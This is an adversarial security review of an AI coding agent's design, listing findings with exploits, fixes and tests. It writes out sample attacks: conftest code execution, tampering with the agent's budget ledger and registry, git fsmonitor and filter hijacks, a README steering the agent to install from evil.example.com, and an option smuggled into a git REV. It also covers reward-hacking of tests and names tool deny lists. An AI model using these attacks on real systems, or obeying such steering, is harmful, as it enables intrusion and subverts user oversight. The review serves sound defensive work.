# 07 — Adversarial technical and security review of DESIGN.md v4.1 ("Crocodile")

Reviewer stance: hostile. I re-derived each control from the design text rather than its own claims. SEC = `05-oss-security.md`, BR = `06-oss-budget-routing-peers.md`. One external fact was checked on the web (Ollama cloud models, item C3).

Severity key: **Critical** = a mandatory requirement (R1–R4) is broken by a realistic attack or the design contradicts itself at the boundary. **High** = exploitable or demo-breaking with modest effort. **Med** = real gap, narrower conditions. **Low** = hygiene.

## Summary table

| # | Sev | Area | One line |
|---|---|---|---|
| C1 | **Critical** | R4 | The zero-LLM ladder, reproduce-first, baseline run and `quote` all **execute repo code with no EXEC approval** (`pytest --collect-only` imports `conftest.py`) |
| C2 | **Critical** | R4 / R2 / R3 | Any approved test/command runs as the same user, so it can rewrite `%APPDATA%\crocodile\` (ledger, registry, policy, config with VKs), plant `.git/config`, or leave a daemon. No post-exec integrity check |
| C3 | **Critical** | R3 | `ollama/<model>-cloud` passes every confidential assert; local Ollama forwards it to ollama.com |
| H1 | High | R4 | A green edit (default **Y**) followed by an auto-run or granted test is code execution approved as "edit" |
| H2 | High | R4 (taint) | Repo-controlled file and symbol names count as **trusted** spans, so an attacker can whitelist their own payload out of provenance |
| H3 | High | Secrets | `search` (rg) bypasses `read_redact`; the redact list misses `.git/config` credential URLs, `.npmrc`, `.pypirc`, `*.pfx` and others |
| H4 | High | R3 | Confidential marker walk starts at `cwd`, not at `--repo`, and never walks down: a nested confidential subtree in a public session goes to the cloud |
| H5 | High | R4 | The git config audit runs only "before the first free git call"; after any EXEC or git mutation, `.git/config` may be hostile |
| H6 | High | R4 | Template git `show --stat REV`: a model-supplied `REV` like `--output=.git/config` is not covered by the option-denial rule as written |
| H7 | High | R2 | The reservation is not a hard bound: tier pricing (Haiku >100k), p95 input calibration, TTL expiry of in-flight calls, Bifrost-internal retries, and "cancel = input only" on timeouts |
| H8 | High | R2 | Trust model: Bifrost runs on the **user's** machine with provider keys in its env, and `crocodile budget set` is user-runnable, so a per-user limit binds only an honest user |
| H9 | High | Contradiction | `doctor` must read the Bifrost VK and routing config, but admin credentials are "never in the agent's process" |
| H10 | High | R1 / R2 | Step-down to local (`num_ctx` 32k) with a 60k-token history: Ollama **silently truncates from the front**, so the session is lost without an error |
| H11 | High | Correctness | Stop-on-green can be reward-hacked: the model may edit the oracle test, conftest or the agent's own repro test. Baseline comparison is by count, not by test id |
| H12 | High | Correctness | Ruff rung: `--fix` (F401, I) and `ruff format` make unapproved writes, delete imports the model is about to use, and read repo ruff config (`unsafe-fixes`, `cache-dir`, `extend`) |
| H13 | High | Schedule | The ablation grid (13 layers × 15 tasks × 2 seeds) plus the main grid is about 500 runs, against the stated 360 and $5–20. It will not fit on 14 Nov |
| M1–M16 | Med | various | See below |
| L1–L8 | Low | various | See below |

---

## Critical

### C1. Tests and collection run repo code before, and without, approval
**Where:** §5.2 `quote()` → `failing_tests(repo)` "0-token pytest --collect-only"; §5.10 B `reproduce()` → `collect_related` (`--collect-only`) + `run_tests(t)` + "the full suite also runs once here to record the baseline"; §2.2 step 12 and §5.10 C: "after an applied edit: verify.ladder(touched)" runs affected tests automatically. §5.5, by contrast, says `run_tests` is "Always approval … amber: pytest runs repo code such as conftest.py, so it is EXEC".
**Exploit:** The repo ships `conftest.py` (or `tests/conftest.py`, a `pytest11` entry point in an editable install, `-p evil` in `[tool.pytest.ini_options] addopts`, or a `setup.cfg [tool:pytest]` section). `crocodile quote "fix x"` runs `pytest --collect-only`. Collection imports every conftest and test module, so `os.system(...)` runs before the user has approved anything, and before a model call was even made. The same happens in `run` at the reproduce/baseline phase. The design text never says these runs prompt, and "0 LLM tokens" is presented as if it meant "free".
**Fix:**
- Make `verify.py` call tests only through `tools.tests.run_tests`, so they pass through `policy.decide`. No module other than `tools/tests.py` may spawn `pytest`; enforce this with an import/AST lint test, the same way the design limits `httpx` to `egress.py`.
- `quote` must not execute anything. Compute `t` from static parsing only: tree-sitter scan for `def test_*` and any test names in the task text.
- At session start, show one **amber "test execution consent"** panel. It lists the exact argv, the interpreter, the conftest/plugin files found (static scan of `conftest.py` at every level, `pytest.ini`, `tox.ini`, `setup.cfg`, `pyproject [tool.pytest*]`, `addopts`, `-p`, `pytest_plugins`), and their hashes. Approval creates a `TestConsent{argv_template, interpreter_sha, cfg_hashes: dict[path, sha], expires_at}` row in `grants`.
- Ladder, reproduce and baseline runs are allowed only while the consent is valid. The consent is voided by any change to a hashed config file, by any edit that adds dangerous APIs (H1), or by any untrusted steering of argv.
- Without consent, the ladder stops at rungs 1–2 (in-process `compile()`, ruff `--isolated`) and the receipt says "tests not run: no consent".
- Run pytest with `-p no:cacheprovider` and `PYTEST_DISABLE_PLUGIN_AUTOLOAD=1` (plugins only by explicit `-p`), plus `--rootdir=<repo> -c <our ini>` if we want to ignore repo addopts. State that conftest.py still runs, by design.
**Tests:** `rt_quote_no_exec`: a repo with `conftest.py` writing `canary.txt`; `crocodile quote` → canary absent. `rt_ladder_requires_consent`: with the fake console answering `n` to the consent, apply a green edit → no pytest process spawned (mock `procs.run`, assert never called with pytest). `rt_addopts_plugin`: `addopts = "-p evilplugin"` is shown in the consent panel.

### C2. An approved child process can rewrite the agent's own state (no sandbox, same user)
**Where:** §5.7 env allowlist *keeps* `APPDATA`, `LOCALAPPDATA` and `USERPROFILE`. All state (`state.db`, `config.yaml` with VKs, `policy.yaml`, `prices.yaml`, registry, journal, shadow repo, empty-hooks dir) lives in `%APPDATA%\crocodile\`. The protected set guards only the agent's *edit* tool. T12 calls the "no OS sandbox" residual an *exfiltration* risk only. Its integrity impact is not analysed.
**Exploit (any one approved `run_tests`, including the auto-runs from C1):**
1. Budget (R2): `sqlite3.connect(os.environ['APPDATA']+'/crocodile/state.db').execute("update principals set daily_usd=1e9")`, or delete `ledger` rows. The local "0 overshoot" gate is gone, and only the async gateway remains.
2. Confidential (R3): delete the `confidential_repos` row and `.crocodile/confidential`. The next session is `public`, because `unreadable(registry)` is false and the row is merely missing. The sticky guarantee was only ever against the agent's own edits.
3. VK theft: read `config.yaml` → `vk_public` → call `127.0.0.1:8080` directly. This spends the user's budget outside our ledger and egress ledger, and the canary audit stays green.
4. Approval bypass later: write `[core] fsmonitor=calc` or `[filter "x"] process=...` into `.git/config`, overwrite `%APPDATA%\crocodile\empty-hooks\pre-commit`, or edit `policy.yaml` (the SHA pin aborts only *mid*-session, and the next session trusts it).
5. Persistence: spawn a detached process (`DETACHED_PROCESS`, or breakaway from a job that allows it) that waits for the next approval and swaps files after the token check (see M4).
**Fix (design-level, layered; state the residual honestly):**
- **Child profile redirection:** in the child env, set `APPDATA`, `LOCALAPPDATA`, `USERPROFILE`, `HOMEPATH`, `TEMP` and `TMP` to a per-call scratch dir `%LOCALAPPDATA%\crocodile\sbx\<call_id>\` (pre-created; deleted after). This defeats env-driven discovery but not hard-coded paths.
- **Integrity watch-set:** before and after every EXEC or git mutation, hash a watch-set: `%APPDATA%\crocodile\{config,policy,prices}.yaml`, `state.db` (via `PRAGMA user_version` plus a `meta(hmac)` row recomputed by the agent after its own writes), `empty-hooks\*`, `<repo>\.git\config`, `.git\hooks\*`, `.git\info\attributes`, `.crocodile\**`, and `.gitmodules`. Any change not made by the agent → abort the session, red banner, `journal(integrity_violation)`, and mark the repo confidential-pending-review if it was confidential. The HMAC key sits in DPAPI (`CryptProtectData`). That is still readable by same-user code that knows to look, so it only raises the bar.
- **Job object:** `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`, no `BREAKAWAY_OK`, and close (kill) the job when the main child exits, not only on timeout. Then no daemon survives.
- **Low integrity level (strong, cheap on Windows):** run children with a Low-IL token (`CreateRestrictedToken` + `SetTokenInformation(TokenIntegrityLevel, S-1-16-4096)`). Low-IL processes cannot write Medium-IL files, which covers all of `%APPDATA%` and `.git`. Tests that need to write must use a Low-labelled scratch (`icacls <scratch> /setintegritylevel low`). If repo writes by tests are required, offer this as `sandbox: low_il` (default on in confidential mode) and fall back with a banner.
- **Registry robustness:** a confidential repo is also recorded in the journal `session_started` (hash-chained). `mode_for` treats "a past session for this repo_id was confidential" as confidential even if the registry row is missing.
- Threat-model row T12 must add "integrity of agent state" with these controls.
**Tests:** `rt_child_edits_ledger` (conftest updates `daily_usd`) → session aborts with an integrity banner, and the next `reserve` uses the restored or refused value. `rt_child_deletes_registry` → next run is still confidential. `rt_child_plants_fsmonitor` → next free `git status` refused, canary absent. `rt_daemon_survives` → after `run_tests` returns, no process from the job is alive.

### C3. Ollama cloud models pass every confidential assertion
**Fact (checked):** Ollama ships cloud models (`gpt-oss:120b-cloud`, `qwen3-coder:480b-cloud`, `:cloud` variants). The **local** daemon on 127.0.0.1:11434 proxies them to ollama.com once the user has run `ollama signin`. Cloud features can be disabled with `OLLAMA_NO_CLOUD=1` or `"disable_ollama_cloud": true` in `~/.ollama/server.json`, followed by a restart (Ollama FAQ / cloud docs).
**Where:** the §5.13 egress asserts check `model.startswith("ollama/")`, `vk_alias=="local"`, a loopback destination, and that "the Ollama base URL resolves to loopback". All of them pass for `ollama/qwen3-coder:480b-cloud`. Bifrost's `allowed_models` on the local VK lists `qwen3-coder:30b`, but this is **[verify D0]** behaviour and is defeated if an admin (or a C2 attacker) adds the cloud tag. The socket guard sees only 127.0.0.1.
**Exploit:** A config typo, a "bigger model" helpful edit, or C2 tampering sets `local.chain: ["ollama/qwen3-coder:480b-cloud"]`. All confidential code then goes to ollama.com, and `crocodile audit` prints PASS.
**Fix:**
- In `egress.py`, keep a hard-coded `CONFIDENTIAL_MODEL_ALLOWLIST` (exact ids, not prefixes) loaded from config *and* pattern-denied: reject `-cloud`, `:cloud`, any `/` in the tag, and any `@host`.
- `doctor` (and session start in confidential mode) calls Ollama `/api/show` for the model and refuses if the response carries `remote_host`/`remote_model`, or if no local blob digest exists in `/api/tags`. It checks that `OLLAMA_NO_CLOUD=1` or `disable_ollama_cloud` is set, and refuses confidential mode otherwise.
- Audit adds "model tag local-weights verified at send time".
**Test:** `px_ollama_cloud_tag`: config local chain = `ollama/gpt-oss:120b-cloud` → confidential request BLOCKED before send; `doctor` FAIL "cloud-capable Ollama".

---

## High

### H1. "Edit" approval launders code execution
A green edit is r ≤ 1 (WRITE = +1), shown in a batch "approve 3 edits? **[Y/n/i]**", with Enter = yes, and `--yes-green` allows it with no console at all. The edit adds `subprocess.Popen(...)`, `__import__('os').system`, `socket`, `urllib`, `ctypes` or `exec(base64...)` to `src/util.py`. The ladder (C1) or an existing `a` grant on the exact `run_tests` argv then executes it without another prompt. `testcfg_hash` covers only `conftest.py`, `pytest.ini` and `pyproject.toml`, not the code under test. Taint marks only "new imports/URLs/base64 ≥ 20" in REPLACE, and `__import__` or `getattr(os,'sys'+'tem')` slip past.
**Fix:**
- Add `exec_surface(diff)`, a static AST check of the REPLACE side for calls and imports in {`os.system`, `os.exec*`, `os.spawn*`, `subprocess.*`, `socket`, `urllib*`, `http.client`, `requests`, `httpx`, `ctypes`, `winreg`, `eval`, `exec`, `compile`, `__import__`, `importlib`, `pickle.loads`, `marshal`, `shutil.rmtree`, `open(...)` on absolute paths}. Any hit makes the edit amber, and red if steered.
- Any edit of a `.py` file under a `TestConsent` makes the next test run show "will execute edited code" in the approval and void any grant **unless** `exec_surface` is empty.
- Default green to `[y/N]`, or keep `[Y/n]` only for diffs with an empty `exec_surface` *and* no new files.
- `--yes-green` must not combine with automatic test execution.
**Test:** `rt_green_edit_then_tests`: the hostile stub edits `src/a.py` to `import subprocess; subprocess.run(["calc"])`, then the ladder runs → prompt is amber with "runs code" and `exec_surface` listed; answering `n` → no process spawned.

### H2. Attacker-controlled names are "trusted" and suppress provenance
§4.1 marks `list`/repo-map output (paths, symbol names) as trusted, and §5.4 `steered_by` requires the value to be "absent from every trusted span". In a malicious repo, file and symbol names are attacker data.
**Exploit:** The README says `run: pip install --index-url https://evil.example.com/simple x`. The repo also contains a file `docs/evil.example.com.md`, or `def evil_example_com_simple(): ...`. The argv value `evil.example.com` appears in trusted list output, so `steered_by` is empty and the call is amber instead of red, and the NET+steered DENY never fires.
**Fix:** Structural output is untrusted for provenance (it is repo data). The only exemption: a field typed `path` whose value **exactly equals** a listed path may skip the match for *that field only*. Strings in argv, URLs, hosts and Tavily queries never get exempted by structural spans. Implement `ProvenanceIndex.add(text, src, trusted, role: Literal["content","path"])` and `steered_by(fields: list[(value, field_type)])`.
**Test:** `rt_trusted_filename_launder`: the fixture above → `pip install` is red "suggested by README.md:N".

### H3. Secret redaction is bypassed by search and incomplete
`read_redact` applies to `read`. `search` is raw rg output, and rg searches `.env` whenever it is not gitignored (common in repos that commit a `.env.example` but also have a real `.env` that is not ignored). Free git `diff/show/log` print secrets committed to history. `.git/config` (free `read`, since protected applies only to writes) often contains `https://user:ghp_xxx@github.com/...`. Missing patterns: `.npmrc`, `.pypirc`, `.netrc`/`_netrc`, `*.p12`, `*.pfx`, `*.jks`, `*.kdbx`, `credentials*.json`, `*service-account*.json`, `secrets.y*ml`, `*.tfstate`, `.docker/config.json`, `id_ed25519*`, `*.ppk`. In public mode all of this goes to the cloud model, and through Bifrost logs.
**Fix:**
- Run rg with `--glob '!<pattern>'` for every `read_redact` entry, plus a post-filter that runs `resolve_in_repo` + the redact match on each result path.
- Add a **content-level secret scanner** in the output gate, applied to *every* tool result before it enters history: regexes for AKIA…, `ghp_`/`gho_`/`github_pat_`, `sk-`, `xox[bp]-`, PEM headers, `://user:pass@`, JWTs, and high-entropy assignments to `*_KEY`/`*_TOKEN`/`*_SECRET`. Replace with `[REDACTED:<kind>:<sha8>]`.
- Treat `.git/config` reads as redacted for URL userinfo.
**Test:** `sec_rg_env`: `.env` with `OPENAI_API_KEY=sk-test...` not gitignored; `search("sk-")` → redacted. `sec_gitconfig_token` → `read(".git/config")` shows `https://[REDACTED]@github.com`.

### H4. Confidential detection: wrong start point, no downward scan
`mode_for(cwd, repo)` walks `upward(cwd)`. `crocodile run --repo D:\conf` from `D:\work` therefore misses `D:\conf\.crocodile\confidential` unless the repo id is already registered. A marker created by hand (`mkdir .crocodile; type nul > .crocodile\confidential`) is not registered. The walk also never looks **down**: running in `D:\mono` (public) with a confidential `D:\mono\clients\acme\.crocodile\confidential` lets free `read`/`search` send acme code to the cloud.
**Fix:**
- Walk upward from `realpath(repo_root)` **and** `realpath(cwd)`.
- At session start, do a bounded downward scan (`os.scandir`, skip `.git`/`node_modules`, cap 50k entries; if the cap is hit → refuse public mode with "cannot prove no nested confidential subtree, use --confidential or mark-public") for `.crocodile/confidential` and for registry realpaths under the root.
- In a public session, `resolve_in_repo` additionally DENIES any path under a confidential subtree, applied to `search` results as a post-filter too.
- `repo_id` matching is on **any** component (first-commit OR realpath OR remote), not on the composite hash.
**Tests:** `px3_repo_flag_from_other_cwd`; `px3_nested_confidential_subdir` → reads under it are DENY, or the session is confidential; `px3_fresh_clone_elsewhere` (same first commit, new path) → confidential.

### H5. The git config audit is one-shot
"Before the first free git call" is too early to be the only check: any approved `run_cmd`/`run_tests` or git mutation (`git checkout` of a branch whose `.gitmodules` matters, `git submodule`, a test script) can append `core.fsmonitor`, `filter.*`, `include.path` or `alias.*`. The pinned `-c` overrides cover fsmonitor/pager/diff.external/hooks, but not **named** filter drivers referenced by `.gitattributes`. `git status`/`git add -A` (shadow snapshot!) can then run a `filter.x.clean` command. The shadow repo uses its own GIT_DIR, but the repo's `.gitattributes` in the worktree still names drivers, and since `sg` has no config for them this is safe only if shadow config is never polluted.
**Fix:** Re-run `audit_repo_config` and re-hash `.git/config`, `.git/info/attributes` and `.gitattributes` (worktree) after **every** EXEC/GIT_MUT, and before every free git call when the hash changed. Also pass `-c filter.<name>.process= -c filter.<name>.clean= -c filter.<name>.smudge= -c filter.<name>.required=false` for every driver name found in any attributes file. Add `-c core.gitProxy= -c http.proxy= -c include.path=` is not possible; rely on the audit for `include*`. For the shadow repo, add `--no-includes`-equivalent safety by keeping its config owned and re-verified (hash) before each `sg`.
**Test:** `rt14b_post_exec_filter`: an approved test writes `[filter "x"] clean = calc` + `* filter=x` into `.gitattributes`; the next free `git status` and the next snapshot → canary absent; banner "git config changed".

### H6. Template git arguments are not validated
`show --stat REV`, `log -n N -- paths`, `diff [--cached] -- paths`. The "model-supplied git arguments" denial list is described for *non-template* calls. `REV = "--output=.git/config"` gives GitPwned again; `REV = "--ext-diff"` or `"--textconv"` are partly neutralised by the forced `--no-ext-diff`, but `--output` is not.
**Fix:** Validate `REV` against `^(?!-)[A-Za-z0-9_./~^@{}:-]{1,200}$`, also resolve it with `rev-parse --verify --end-of-options REV^{commit}` and pass the resolved SHA. Validate `N` as an int in [1, 200]. Always emit `--end-of-options` before revs and `--` before paths. Apply the option-prefix matcher to **every** model-originated string in any git call.
**Test:** `rt12b_template_rev`: `git.show(rev="--output=.git/config")` → DENY, `.git/config` unchanged.

### H7. The reservation is not a hard upper bound
1. **Tier pricing:** Haiku `tier_over_100k.in = 0.50` > `cache_write_5m = 0.125`. `usd = p.cache_write * est_in` underprices by 4× above 100k, and `reconcile` uses `p.in_` without the tier, so the overshoot is not even recorded. OpenAI has no `cache_write` key (KeyError → denied, or worse if defaulted to 0).
2. **p95 calibration:** by construction, 5% of calls exceed `est_in`. "Overshoot $0.0000" is a claim about the mock, not the real system.
3. **TTL 600 s:** worst-case call = Bifrost 3 attempts × 120 s + backoff + fallback provider 3 × 120 s ≥ 720 s, and a laptop can sleep. `expire_stale` frees the held money while the call is in flight, and a parallel process spends it.
4. **Hidden retries:** Bifrost `max_retries: 2` can bill an upstream attempt that timed out client-side; the client also retries ≤ N. The reservation covers one completion.
5. **Cancel = input only on timeout/network error:** the provider may have finished and billed full output. The real cost lands after other reservations already consumed the headroom.
6. **Calls outside the loop:** `compact()`'s `cheap_model`, localisation stage 2, the repro stub, HALF-OPEN probes and `count_tokens` are not shown going through `budget.reserve`.
**Fix:**
- `worst_in_price(m, est_in) = max(in, cache_write_5m, cache_write_1h if used)` *at the tier of est_in*; reconcile applies tiers. Price schema validated by pydantic: required keys per provider, and tiers mandatory when the provider has them.
- Bound input by a provable ceiling: `bound_in = utf8_bytes(serialized_request) + OVERHEAD_TOOLS` (BPE tokens ≤ bytes). Use `bound_in` instead of p95 when `remaining < 3 × usd_estimate`. Report "hard-bounded" only in that mode.
- Lease instead of TTL: each held row stores `(pid, process_start_time, heartbeat)`. Expire only rows whose owner is dead, or whose heartbeat is > 60 s old *and* the egress call has returned. An expired row that later receives usage is still settled.
- On timeout/network error **after send**: keep the row `held` at the full reserved amount until `/api/logs` reconciles by request id, or 15 min pass → settle at full. Use `cancel(input-only)` only for client-side abort before the first byte left.
- Set Bifrost `max_retries: 0` (the client owns retries, each with its own reservation), or multiply the reservation by `(1+max_retries)` per chain member.
- `egress.post_bifrost` **requires** a `reservation_id` argument for a row in state `held`. Requests without one raise, which structurally forces every model call (compaction, probes, localisation) through the budget.
**Tests:** `test_tier_reserve_haiku_150k`; `test_inflight_not_expired_by_peer` (a slow mock at 700 s and a second process); `test_timeout_keeps_hold`; `test_egress_requires_reservation`; race demo with a real tokenizer variance injected (±20%) still shows ≤ limit.

### H8. Trust model for "per-user limits" is undefined
§2.1 says Bifrost is local (127.0.0.1) on the user's machine with `env.ANTHROPIC_API_KEY`. §4.2 calls Bifrost "the cross-machine backstop". If Bob runs his own Bifrost, Bob owns the provider keys and the admin creds, so his $0.05 is advisory. `crocodile budget set USD` is a user command, so Bob can raise his local gate. A clock change (`window` = local UTC date) gives a fresh day on both the ledger and a same-host Bifrost.
**Fix:** State two deployment profiles. **Shared gateway** (the R2 claim): Bifrost runs on a host or under a Windows service account that the user cannot read (provider keys and admin creds there only). The agent reaches it at a configured host over TLS (socket guard allowlist updated), and the user holds only a VK. **Single-user demo**: limits are self-imposed; say so. `budget set` becomes admin-only: `daily_usd` is read from the VK budget via the governance read endpoint (or an admin-signed `limits.json`, Ed25519 public key pinned in the code), and the local ledger uses `min(local, gateway)`. Ledger windows use the gateway's reset timestamp, not the local clock; reject a session if the local clock is behind the newest ledger row.
**Test:** `px7b_budget_set_non_admin` → refused; `test_clock_rollback` → the next reserve is refused with "clock skew".

### H9. Doctor cannot see what it claims to check
Doctor verifies `vk_local.provider_configs == {ollama}`, budgets, routing rules, `enforce_governance_header` and no semantic cache. These are governance reads that need admin auth, and admin creds are "never in the agent's process" (PX-5).
**Fix:** Split into `crocodile admin doctor` (admin shell, reads config, writes a **signed attestation** `{vk_alias_hash, provider_set, rules_hash, ts}` with an admin Ed25519 key) and `crocodile doctor` (user, verifies the signature and freshness < 24 h, plus black-box probes it can do with the local VK: a request for `anthropic/claude-haiku-5-5` with VK_local must return 4xx and create **no** egress to a provider; check the Bifrost log via the same failure).
**Test:** `doctor_drift`: the admin adds anthropic to the local VK → the user doctor's black-box probe gets 200 → FAIL "local VK reaches cloud".

### H10. Local step-down silently truncates context
Ollama's default context is small, and through the OpenAI-compatible endpoint the per-request `num_ctx` is not honoured. The context length must come from a Modelfile `PARAMETER num_ctx` or `OLLAMA_CONTEXT_LENGTH`. Ollama truncates oversized prompts **from the front without an error**, dropping tools and the system prompt. A cloud session at 60k tokens that steps down to local (budget) or a confidential long session will "keep the session" in the journal but send garbage.
**Fix:** `Route` carries `ctx_window` from config (doctor measures it with a known-length probe: a 30k-token prompt with a marker at position 0, asking the model to echo it). Before every call, `context.fit(route.ctx_window * 0.7)` is mandatory: mask → hand-off capsule (H) → refuse. A rung change triggers fitting *before* the first call on the new rung. Build `crocodile-qwen` from a Modelfile with `num_ctx 32768` in `init`.
**Test:** `test_stepdown_fits_window`: a 60k history then a Denied → the first local request body is ≤ 0.7 × 32k tokens and starts with the frozen tools/system segment.

### H11. Stop-on-green can be gamed, and the comparison is too weak
The model can edit the oracle test (`assert x == y` → `assert True`), add `pytest.skip`, edit `conftest.py` to deselect tests, or edit its *own* repro test after it failed. The "full suite no worse than baseline" check is illustrated by counts ("212 passed (baseline 211)"). The bench "clean copy" wording does not state that pristine tests are restored.
**Fix:**
- At oracle creation, freeze `OracleSpec{test_ids, file_shas: {test file, every conftest, pytest config}}`. Any edit to those paths after the freeze is red ("modifies the success criterion") and, if applied, invalidates green until the user re-confirms the oracle.
- Green also requires: no new `skip`/`xfail`/`deselect` markers in the diff, and the oracle ids present in the run report (not deselected).
- Compare baseline by **id sets**: `regressed = passed_at_baseline − passed_now` must be ∅, and every oracle id must pass. Rerun the oracle once on first green (flake guard).
- Bench: copy the original test files over the agent's tree before the hidden run.
**Tests:** `test_oracle_edit_red`; `test_skip_marker_not_green`; `test_baseline_set_regression` (fix B, break A → not green).

### H12. The ruff rung writes, mutates semantics and trusts repo config
`ruff check --fix --select F,E9,I` + `ruff format` on touched files: (a) these writes were never approved (the user approved the model's diff); (b) F401 removes an import the model added for its *next* edit, or a re-export in `__init__.py` (an API break); `I` can reorder side-effecting imports; (c) `ruff format` rewrites whole files, so the model's later SEARCH blocks stop matching exactly (more matcher failures, read-cache invalidation, more tokens) and the user gets unrequested style churn; (d) ruff reads repo `pyproject.toml`/`ruff.toml` (`unsafe-fixes = true`, `extend = "..\\..\\x.toml"`, `cache-dir = "C:/..."` → writes outside the repo).
**Fix:** `ruff check --isolated --no-cache --select F821,F822,F823,E9 --output-format json` with **no `--fix`** and no format. Report findings to the model in the G format. Optional autofix only behind `layers.lint_fix`, restricted to lines inside the approved hunk, and shown as a follow-up green diff. Rung 1 uses in-process `compile(src, path, "exec")` (no `.pyc` written).
**Test:** `test_ruff_no_write` (file sha unchanged after the ladder); `test_ruff_ignores_repo_config` (repo `cache-dir` outside the repo → no dir created).

### H13. The bench plan does not fit the time or the stated cost
Main grid 30 × 2 seeds × 2 agents = 120 runs, plus 30 Sonnet runs, plus ablations 13 layers × 15 × 2 = 390, about 540 runs. The design says "about 360 runs, $5–20". At 2–4 min each that is 18–36 h of wall time, on 14 Nov, which is also red-team day. Polyglot Python (Exercism) tasks are single-file with visible tests, so localisation, repo map, thrash, masking and compaction barely fire, and ablating them measures noise.
**Fix:** Ablate **4 groups** (context-shaping: map+mask+compact+readcache; verification: ladder+repro+stop_green; control: thrash+escalate; edit: matcher), giving 4 × 15 × 2 = 120 runs. Run the main grid overnight 13→14 Nov with a parallelism of 4 (and a separate bench VK so the race/ledger is not polluted). Add 5–8 multi-file tasks (a small SWE-bench-Lite-style subset, or synthetic bugs in a 30-file repo) so the accuracy layers are actually exercised. Report "layer not exercised" when its counter is 0.
**Test:** `bench --dry-run` prints the run count and cost upper bound from `prices.yaml`; CI fails if it exceeds the bench VK cap.

---

## Medium

**M1. Grants and `never_grantable` gaps.** `pytest`, `tox`, `nox`, `poetry`, `pipx`, `uvx`, `conda`, `cargo`, `go`, `dotnet`, `java`, `bun`, `deno`, `docker`, `curl`, `wget`, `ssh`, `scp`, `cscript`, `wscript`, `mshta`, `rundll32`, `regsvr32`, `certutil`, `bitsadmin`, `msiexec`, `schtasks`, `reg`, `crocodile` are missing. Fix: invert to `grantable_allowlist` (empty by default; only the consented test argv). Test: `a` on `["pytest"]` is not offered.

**M2. `red_paths` misses execution-relevant files.** Add `setup.cfg`, `noxfile.py`, `Makefile`, `.pre-commit-config.yaml`, `**/conftest.py` (the bare `conftest.py` glob may match only the root), `**/__init__.py` with an exec surface, `sitecustomize.py`, `usercustomize.py`, `*.pth`, `.devcontainer/**`, `.husky/**`, `requirements*.txt`, `Dockerfile`, `.python-version`, `.coveragerc`. Test: property test with nested paths.

**M3. rg and junctions/symlinks on Windows.** Whether ripgrep's walker treats NTFS junctions as symlinks (not followed without `-L`) is **[verify D0]**. Regardless, post-filter every rg result path through `resolve_in_repo` (and the confidential-subtree filter from H4). Test: junction `docs → C:\Users\<u>\.ssh` → `search("PRIVATE")` returns nothing.

**M4. TOCTOU outside the token.** The token covers argv, exe stat and pre-images of *edited* paths, but not the scripts and modules a command will execute (`python scripts/x.py`, the imported package), nor `PYTHONPATH`/`.pth` effects. A surviving daemon (C2) can modify them after approval. Fix: include the sha of every repo file named in argv plus a Merkle hash of `*.py` under the repo (cheap with the read cache) in the token; re-check pre-exec. Also open files for read with `FILE_FLAG_OPEN_REPARSE_POINT` and verify `GetFinalPathNameByHandle` after open. Exe stat → use sha256 for exes < 50 MB. Test: RT-32b swaps `scripts/x.py` after approval → re-prompt.

**M5. Non-idempotent replay on resume.** The journal has `tool_proposed` and `tool_result` but no `tool_started`. A crash mid-`run_cmd` (or mid-`git push`) leaves "proposed without result", and resume **re-asks** the same approval, so a user pressing `y` duplicates side effects. Fix: write `tool_started{call_id, snapshot}` before spawn. On resume, a started-without-result call is shown as "OUTCOME UNKNOWN", with the worktree diff against the snapshot, and is never re-offered. The model gets `{"status":"unknown","diff":...}`. Test: `crash_resume_mid_cmd` → no second prompt for the same call_id.

**M6. Cross-provider failover with tool history is untested.** D0 check #1 tests a single call. Multi-turn histories with Anthropic `tool_use` ids, `cache_control` blocks (or thinking blocks) must be translated to OpenAI and back. Fix: add D0 check 1b, a 6-turn tool history failover, and an assert that the tool-call id mapping is stable. Test: `outage_midtask_toolhistory`.

**M7. R1 has no last-resort takeover.** When both clouds are down, the design PAUSEs and exits. Add an `ollama/` tail to the public chain as a user-visible "degraded takeover" (banner, `price_delta = -100%`), gated by H10 fitting. Keep PAUSE only when Ollama is also unhealthy. Test: `outage_all_cloud` → task continues on local with a banner.

**M8. The lossless gate can explode tokens.** `assert must_keep ⊆ shown` with 400 failing tests or a 10k-line traceback storm violates `max_bytes` (or crashes on the assert). Fix: group must-keep lines by error signature ("×412 AssertionError in test_x[...]; first 3 shown"), and hard-cap with an explicit "N more must-keep lines in out:42". Test: `test_gate_1000_failures` ≤ 10 KB with every distinct signature kept.

**M9. Thrash false positives.** `reread×3` fires when the model pages a large file through 3 windows; `no_delta×4` fires during legitimate localisation; `same_sig×2` fires on a multi-step fix whose first step does not touch the failing assertion. A relocalise then resets context to the capsule and loses work. Fix: reread = same `(path, range)` *and* unchanged sha; `no_delta` counts only turns after the first applied edit; `same_sig` requires that the two edits touched overlapping hunks. Log every trigger with `would_have_solved` in the bench. Test: `test_thrash_paging_no_trigger`.

**M10. Agent-written repro test becomes a self-fulfilling oracle.** The same model and the same misunderstanding produce a test that fails on an assertion, so the "fix" satisfies a wrong test. Fix: show the repro test as **amber** "defines success" (not green), freeze it (H11), and mark the receipt "oracle written by agent: review". Never print SOLVED for `created_by=agent`; print "PASSES AGENT TEST". Test: renderer snapshot.

**M11. Confidential data at rest.** Journal blobs, spill files, Bifrost `enable_logging` content logs, and the `traces`/`experience` tables keep confidential code indefinitely. `%APPDATA%` is *Roaming* (synced off-machine in domain profiles). Bifrost `/api/logs` may be readable by any local process **[verify D0: is it behind admin auth?]**. Fix: store data under `%LOCALAPPDATA%`; for confidential sessions, set `enable_logging` content off (or per-VK), encrypt blobs with DPAPI, and add a retention setting. Doctor checks `/api/logs` needs auth. Test: `audit_at_rest` scans `%APPDATA%\Roaming` for canaries → 0.

**M12. The canary claim is overstated.** Canaries detect only verbatim canary text in our egress. They do not detect paraphrase, partial code, child-process exfil (T12) or direct VK use (C2). They also modify the user's confidential files. Fix: the README wording becomes "zero canary hits in agent egress"; put canaries in `.crocodile/` plus *one* opt-in file only; and in confidential mode, block child network best-effort (proxy env set to a dead `127.0.0.1:9`, plus a warning that this is not enforcement). Test: claims lint.

**M13. Confidential mode and `run_cmd`.** `curl` detection relies on `explain`, so `python -c "import urllib…"` is amber. Fix: in confidential mode every EXEC is red with "network not blocked for child processes". Low-IL from C2 does not block network, so say so.

